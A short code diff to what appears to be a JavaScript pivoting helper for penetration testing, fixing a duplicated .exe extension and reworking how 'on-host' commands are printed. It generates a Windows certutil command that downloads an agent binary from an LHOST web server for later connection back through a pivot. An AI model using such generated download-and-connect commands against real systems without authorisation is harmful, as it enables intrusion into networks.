@@ -71,7 +71,7 @@
     if (osName === 'windows') {
       // Must save WITH the .exe extension, or the `.\agent.exe -connect` line below fails with
       // "not recognized as an internal or external command" (certutil keeps whatever name you give it).
-      var winBin = bin + '.exe';
+      var winBin = /\.exe$/i.test(bin) ? bin : (bin + '.exe');
       var wurl = 'http://' + (c.lhost || 'LHOST') + ':8000/' + winBin;
       return 'certutil -urlcache -f ' + wurl + ' ' + winBin + '   # serve it: python3 -m http.server 8000';
     }
@@ -135,10 +135,11 @@
     L.push(echo('[*] ' + t.label + ' local half: LHOST=' + c.lhost + '  PIVOT=' + c.pivotHost + '  SUBNET=' + c.subnet + '  PORT=' + c.port));
     (t.setup ? t.setup(c) : []).forEach(function (line) { L.push(line); });
     // print the ON-HOST half before we hand the terminal to the (foreground) server.
-    if ((t.onhost ? t.onhost(c) : []).length) {
+    var onh = onHostLines(t.id, c, c.os);
+    if (onh.length) {
       L.push(echo(''));
       L.push(echo('[*] Run the ON-HOST half on the target now (copy it from the Pivot Station):'));
-      t.onhost(c).forEach(function (line) { L.push(echo('    ' + line)); });
+      onh.forEach(function (line) { L.push(echo('    ' + line)); });
     }
     if (t.consoleSteps && t.consoleSteps.length) {
       L.push(echo(''));
